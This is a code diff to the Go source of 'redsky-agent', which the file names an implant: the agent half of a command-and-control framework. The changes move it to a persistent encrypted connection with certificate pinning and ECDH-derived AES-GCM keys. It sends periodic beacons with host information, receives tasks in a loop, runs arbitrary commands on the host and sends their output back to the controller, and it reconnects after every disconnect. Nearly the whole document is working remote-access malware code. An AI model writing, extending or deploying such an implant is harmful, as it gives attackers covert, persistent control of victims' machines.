@@ -1,5 +1,7 @@
 // redsky-agent — the implant.
-// Phase 2: TLS with CA fingerprint pinning + X25519 ECDH + AES-256-GCM.
+// Phase 5: persistent connection. One TLS + ECDH handshake, then a loop that
+// reads tasks, executes them, and sends results until the core closes the
+// connection or sends a kill.
 package main
 
 import (
@@ -9,6 +11,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"net"
@@ -16,6 +19,7 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"sync"
 	"time"
 
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
@@ -27,9 +31,10 @@ import (
 func main() {
 	host := flag.String("host", "127.0.0.1", "core host")
 	port := flag.Int("port", 4444, "core port")
-	interval := flag.Int("interval", 5, "beacon interval seconds")
 	tag := flag.String("tag", "", "agent tag (used to derive ID)")
 	caFP := flag.String("ca-fingerprint", "", "SHA-256 fingerprint of the engagement CA (colon hex)")
+	beaconSec := flag.Int("beacon", 30, "beacon interval seconds (heartbeat on the live connection)")
+	reconnectSec := flag.Int("reconnect", 10, "reconnect delay after disconnect")
 	flag.Parse()
 
 	if *caFP == "" {
@@ -41,22 +46,23 @@ func main() {
 		agentID = fmt.Sprintf("rs-%08x", rand.Uint32())
 	}
 
-	log.Printf("redsky-agent starting id=%s target=%s:%d (TLS)", agentID, *host, *port)
+	log.Printf("redsky-agent starting id=%s target=%s:%d", agentID, *host, *port)
 
 	for {
-		if err := beaconOnce(*host, *port, agentID, *caFP); err != nil {
-			log.Printf("beacon: %v", err)
+		if err := runSession(*host, *port, agentID, *caFP, *beaconSec); err != nil {
+			log.Printf("session ended: %v", err)
 		}
-		time.Sleep(time.Duration(*interval) * time.Second)
+		time.Sleep(time.Duration(*reconnectSec) * time.Second)
 	}
 }
 
-func beaconOnce(host string, port int, agentID, caFP string) error {
+// runSession opens one connection and services it until it dies.
+func runSession(host string, port int, agentID, caFP string, beaconSec int) error {
 	tlsCfg, err := rsTLS.ClientTLSConfig(caFP)
 	if err != nil {
 		return fmt.Errorf("tls config: %w", err)
 	}
-	rawConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 5*time.Second)
+	rawConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
 	if err != nil {
 		return fmt.Errorf("dial: %w", err)
 	}
@@ -67,7 +73,6 @@ func beaconOnce(host string, port int, agentID, caFP string) error {
 	}
 
 	// --- ECDH handshake ---
-	// 1. Read core's hello.
 	frame, err := wire.ReadFrame(conn)
 	if err != nil {
 		return fmt.Errorf("read hello: %w", err)
@@ -83,8 +88,6 @@ func beaconOnce(host string, port int, agentID, caFP string) error {
 	if err != nil {
 		return fmt.Errorf("bad core pubkey: %w", err)
 	}
-
-	// 2. Agent generates its ephemeral key and replies with its pubkey.
 	agentKey, err := crypto.GenerateEphemeralKey()
 	if err != nil {
 		return fmt.Errorf("gen key: %w", err)
@@ -97,8 +100,6 @@ func beaconOnce(host string, port int, agentID, caFP string) error {
 	if err := wire.WriteFrame(conn, 0, replyRaw); err != nil {
 		return fmt.Errorf("send reply: %w", err)
 	}
-
-	// 3. Both sides derive the same AES-256 session key.
 	key, err := crypto.DeriveKey(agentKey, corePub)
 	if err != nil {
 		return fmt.Errorf("derive key: %w", err)
@@ -108,47 +109,83 @@ func beaconOnce(host string, port int, agentID, caFP string) error {
 		return fmt.Errorf("new session: %w", err)
 	}
 
-	// --- encrypted loop ---
-	// 4. Send beacon (encrypted).
-	info := collectInfo()
-	beacon := proto.Beacon{AgentID: agentID, Info: info, TS: time.Now().Unix()}
-	if err := sendEncrypted(conn, sess, proto.TypeBeacon, beacon); err != nil {
+	// --- initial beacon ---
+	var writeMu sync.Mutex
+	send := func(t proto.MessageType, payload any) error {
+		writeMu.Lock()
+		defer writeMu.Unlock()
+		return sendEncrypted(conn, sess, t, payload)
+	}
+	if err := send(proto.TypeBeacon, proto.Beacon{
+		AgentID: agentID,
+		Info:    collectInfo(),
+		TS:      time.Now().Unix(),
+	}); err != nil {
 		return fmt.Errorf("send beacon: %w", err)
 	}
 
-	// 5. Read one task.
-	frame, err = wire.ReadFrame(conn)
-	if err != nil {
-		return fmt.Errorf("read task: %w", err)
-	}
-	taskRaw, err := sess.Decrypt(frame.Payload)
-	if err != nil {
-		return fmt.Errorf("decrypt task: %w", err)
-	}
-	var env proto.Envelope
-	if err := json.Unmarshal(taskRaw, &env); err != nil {
-		return fmt.Errorf("task envelope: %w", err)
-	}
+	// --- heartbeat goroutine ---
+	stopBeacon := make(chan struct{})
+	go func() {
+		t := time.NewTicker(time.Duration(beaconSec) * time.Second)
+		defer t.Stop()
+		for {
+			select {
+			case <-stopBeacon:
+				return
+			case <-t.C:
+				_ = send(proto.TypeBeacon, proto.Beacon{
+					AgentID: agentID,
+					Info:    collectInfo(),
+					TS:      time.Now().Unix(),
+				})
+			}
+		}
+	}()
+	defer close(stopBeacon)
 
-	switch env.Type {
-	case proto.TypeTask:
-		var task proto.Task
-		if err := json.Unmarshal(env.Payload, &task); err != nil {
-			return fmt.Errorf("task payload: %w", err)
+	// --- task loop ---
+	for {
+		frame, err := wire.ReadFrame(conn)
+		if err != nil {
+			if err == io.EOF {
+				return fmt.Errorf("core closed connection")
+			}
+			return fmt.Errorf("read frame: %w", err)
 		}
-		result := runTask(task)
-		if err := sendEncrypted(conn, sess, proto.TypeResult, result); err != nil {
-			return fmt.Errorf("send result: %w", err)
+		if frame.Flags&wire.FlagEncrypted == 0 {
+			return fmt.Errorf("unexpected plaintext frame")
 		}
-	case proto.TypeSleep:
-		var s proto.Sleep
-		_ = json.Unmarshal(env.Payload, &s)
-		log.Printf("core requested sleep %dms (phase 2 ignores)", s.MS)
-	case proto.TypeKill:
-		log.Printf("core requested kill, exiting")
-		os.Exit(0)
+		plain, err := sess.Decrypt(frame.Payload)
+		if err != nil {
+			return fmt.Errorf("decrypt: %w", err)
+		}
+		var env proto.Envelope
+		if err := json.Unmarshal(plain, &env); err != nil {
+			return fmt.Errorf("envelope: %w", err)
+		}
+		switch env.Type {
+		case proto.TypeTask:
+			var task proto.Task
+			if err := json.Unmarshal(env.Payload, &task); err != nil {
+				continue
+			}
+			log.Printf("task %s: %s %v", task.ID, task.Cmd, task.Args)
+			result := runTask(task)
+			if err := send(proto.TypeResult, result); err != nil {
+				return fmt.Errorf("send result: %w", err)
+			}
+		case proto.TypeSleep:
+			var s proto.Sleep
+			_ = json.Unmarshal(env.Payload, &s)
+			log.Printf("sleep request %dms (not implemented in phase 5)", s.MS)
+		case proto.TypeKill:
+			log.Printf("kill requested, exiting")
+			os.Exit(0)
+		default:
+			log.Printf("unknown message type: %s", env.Type)
+		}
 	}
-	return nil
 }
 
 func collectInfo() proto.AgentInfo {
@@ -179,13 +216,11 @@ func runTask(t proto.Task) proto.Result {
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
-
 	done := make(chan error, 1)
 	if err := cmd.Start(); err != nil {
 		return proto.Result{TaskID: t.ID, Error: err.Error(), ExitCode: -1}
 	}
 	go func() { done <- cmd.Wait() }()
-
 	select {
 	case err := <-done:
 		rc := 0
@@ -196,12 +231,7 @@ func runTask(t proto.Task) proto.Result {
 				rc = -1
 			}
 		}
-		return proto.Result{
-			TaskID:   t.ID,
-			Stdout:   stdout.String(),
-			Stderr:   stderr.String(),
-			ExitCode: rc,
-		}
+		return proto.Result{TaskID: t.ID, Stdout: stdout.String(), Stderr: stderr.String(), ExitCode: rc}
 	case <-time.After(timeout):
 		_ = cmd.Process.Kill()
 		return proto.Result{TaskID: t.ID, Error: "timeout", ExitCode: -1}
